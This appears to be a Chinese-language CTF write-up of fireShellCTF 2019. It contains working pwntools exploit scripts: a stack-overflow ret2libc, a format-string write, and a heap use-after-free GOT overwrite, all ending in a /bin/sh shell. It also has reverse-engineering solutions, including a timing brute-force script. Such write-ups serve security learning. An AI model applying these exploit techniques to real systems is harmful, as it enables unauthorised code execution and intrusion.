> 原文链接: https://www.anquanke.com//post/id/170473 


# fireShellCTF 2019 RE&amp;PWN


                                阅读量   
                                **191074**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01aa9e9214544ee442.png)](https://p4.ssl.qhimg.com/t01aa9e9214544ee442.png)



## PWN

### <a class="reference-link" name="leakless"></a>leakless

这题就是一个简单的栈溢出，有`puts`，依次泄露libc版本，getshell即可

不过做题时有点问题，本地成功，远程没有回显，看到这题叫`leakless`，感觉事情不太对劲

然而换了题目给的备用服务器就成功了,这里利用了一个libcSearch的库但是读者可以利用libc-data进行一个搜索。题目比较简单就不多说了。

```
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

p = remote("35.243.188.20" , 2002)
elf = ELF("./leakless")

payload = "a" * 0x48 + "b" * 4 + p32(elf.plt["puts"]) + p32(elf.sym["feedme"]) + p32(elf.got["puts"])
p.sendline(payload)
puts_addr = u32(p.recv(4))
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")

payload = "a" * 0x48 + "b" * 4 + p32(system) + p32(elf.sym["feedme"]) + p32(bin_sh)
p.sendline(payload)

p.interactive()
```

### <a class="reference-link" name="casino"></a>casino

这个题有点意思，首先是一个printf的洞

[![](https://p1.ssl.qhimg.com/t0121df0e46ed4fdb49.png)](https://p1.ssl.qhimg.com/t0121df0e46ed4fdb49.png)

时间种子和unix时间戳有关，后面循环99次，如果v5(累加和)大于100就打印flag

注意到这里循环只有99次，而bet只有1，也就是说就算数字正确99次，也不满足条件

正好printf还没用上，就用来把bet改成一个稍大的值，2就可以

```
from pwn import *
context.log_level = 'debug'

#p = process("./casino")
p = remote("35.243.188.20","2001")
payload = "aaa%11$n" + p64(0x602020)

p.send(payload)
p.interactive()
```

exp里只改了bet的值，然后交给终端交互，因为感觉time写起来有点麻烦，time和rand相关都交给C了

```
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;string.h&gt;
#include&lt;time.h&gt;

int main(int argc, char**argv) `{`
    unsigned int t = time(0);
    unsigned int seed = t / 0xA + 3;
    srand(seed);
    for (int i = 0; i &lt; 100; i++) `{`
        printf("%d ", rand());
    `}`
    return 0;
`}`
```

因为时间种子是unix时间戳除以10，所以有很大的容错性…

把C代码输出结果喂给终端就可以了

不过有点坑的地方是，远程经常死在42/100和83/100，也没想到理由

然而换了个服务器就好了

### <a class="reference-link" name="babyheap"></a>babyheap

这个题目刚拿到的时候还是比较困恼的因为这里没有可以泄漏的函数，但是发现给我们的buf是一个空指针可以利用这个空指针进行操作。

#### <a class="reference-link" name="%E4%B8%BB%E7%A8%8B%E5%BA%8F"></a>主程序

[![](https://p0.ssl.qhimg.com/t018815cb2530774d3e.png)](https://p0.ssl.qhimg.com/t018815cb2530774d3e.png)<br>
这里简单的看一看主程序，其中很多我们有进行标名称大概就是一个create函数（只可执行有限次数）无法输入字符仅用做固定0x60进行malloc<br>
然后delte操作，然后edit操作，接着给了我们一个gift操作这里可以让我们额外申请一个块且可输入。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E7%82%B9"></a>漏洞点

这里有一个uaf洞，但是说实在的其中没有常规泄漏的操作让我有点迷，最后发现存在buf这一个空指针可以加以利用。

[![](https://p5.ssl.qhimg.com/t01ee6bb82b640073e9.png)](https://p5.ssl.qhimg.com/t01ee6bb82b640073e9.png)

[![](https://p4.ssl.qhimg.com/t0197529b921ca87487.png)](https://p4.ssl.qhimg.com/t0197529b921ca87487.png)

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路

首先利用错位技术绕过对size的检查和fastbin attack将我们的堆分配到bss段从而改变buf指针，指向atoi函数，泄漏出libc及地址。下一步buf-&gt;atoi-&gt;got，将got内容改为system然后在下次选项输入/bin/sh就可以getshell了。

#### <a class="reference-link" name="exp"></a>exp

```
from pwn import *
p=process('./babyheap')
#p=remote('51.68.189.144',31005)
context(log_level='debug')
a=ELF('./babyheap')
e = a.libc
p.readuntil('&gt;')
gdb.attach(p)
def create():
    p.writeline('1')
    p.readuntil('&gt;')
def dele():
    p.writeline('4')
    p.readuntil('&gt;')    
def edit(a):
    p.writeline('2')
    p.readuntil('Content?')
    p.write(a)
    p.readuntil('&gt;')
def gift(a):
    p.writeline('1337')
    p.readuntil('Fill')
    p.write(a)
    p.readuntil('&gt;')
create()
dele()

edit(p64(0x602095-8))
create()
gift('a'*(59-0x10)+p64(0x602060))

p.writeline('3')
p.readuntil('Content: ')
libc=u64(p.readuntil('n')[:-1].ljust(8,'0'))-e.symbols['atoi']
oneget=libc+e.symbols['system']    
edit(p64(oneget))
print hex(oneget)
p.write('/bin/sh')
p.interactive()
```



## RE

### <a class="reference-link" name="Blackbox-0"></a>Blackbox-0

`.net`的逆向，加了混淆，用`dnSpy`打开，转到入口点后，调试很久后发现在 `u000Fu2009`处发现可疑的函数

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015295b4f26d646740.png)

text是可疑的变量，下断点后运行几次发现base64加密后的flag

`RiN7TmljZV9hbmFsaXN5c19icm9fPV1ffQo=`

解密后得到flag：`F#`{`Nice_analisys_bro_=]_`}``

### <a class="reference-link" name="Blackbox-1"></a>Blackbox-1

和第一题差不多，断点位置也几乎一样，不过这次下了断点两下就出明文flag了

[![](https://p0.ssl.qhimg.com/t018f69b0e4e0307974.png)](https://p0.ssl.qhimg.com/t018f69b0e4e0307974.png)

### <a class="reference-link" name="Blackbox%20cipher"></a>Blackbox cipher

和前两题差不多，关注`u0002u200A`函数的第80行`result`

可疑的字符串`RiN7SXQnc19hbGxfYWJvdXRfbWVtb3J5X2ZvcmVuc2ljc30K`

base64解密后发现`F#`{`It's_all_about_memory_forensics`}``

> 三题设置的比较简单，但还是感到自己对混淆这块的不熟悉

### <a class="reference-link" name="crackme"></a>crackme

做了前三个逆向，既然都是连蒙带猜的黑盒…

处理函数比较复杂，不太熟悉线程相关，还是黑盒吧

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0155d2bf182292a00d.png)

运行下这个程序，尝试输入几次，发现输入`F#`和`F#`{``时，会有一些线索

[![](https://p1.ssl.qhimg.com/t01679859cc33729738.png)](https://p1.ssl.qhimg.com/t01679859cc33729738.png)

注意到这就是比赛给的一些信息`H4ck1ng Fl4m3s In th3 Sh3lL`

猜测这题还是黑盒，用爆破应该就行

IDA看到有一段字符数组，里面有`F # `{` `}`` ，应该就是爆破需要的字符集

[![](https://p0.ssl.qhimg.com/t01195fa3b213cc3cfc.png)](https://p0.ssl.qhimg.com/t01195fa3b213cc3cfc.png)

而如果输入的k个字符和flag的前k位有不同，那么程序会过很久才会回显，利用这一点可以在脚本中设置`timeout`，其余部分比较简单

这里赛后学习时找到了一个比我写的好一些的脚本，又修改了一下

```
from pwn import *
context.log_level = 'debug'

charset = '_#G1VWk92`{`5toOnCQF6zXpifDh8SdYlev uq0RMajKsrHUx`}`IyTbgAm3L4BcNEZJ7w'
flag = "F#`{`"
info = 'H4ck1ng Fl4m3s In th3 Sh3lL'

def func(a, b):    # strcmp
    if len(a)==0:
        return 0
    count = 0
    while a[count] == b[count]:
        count+=1
    return count

def test(c):
    p = process('crackme')
    p.sendline(flag + c)
    result = p.recv(timeout=0.5)
    p.close()
    return result

for i in range(len(info)):
    for c in charset:
        if func(test(c),info) == i+4:
            flag += c
            print flag
            break
# add '`}`'
```



## 总结

题目有难有简单，打国际赛最主要的涨姿势和开拓自己的眼界。。。继续学习道路漫长
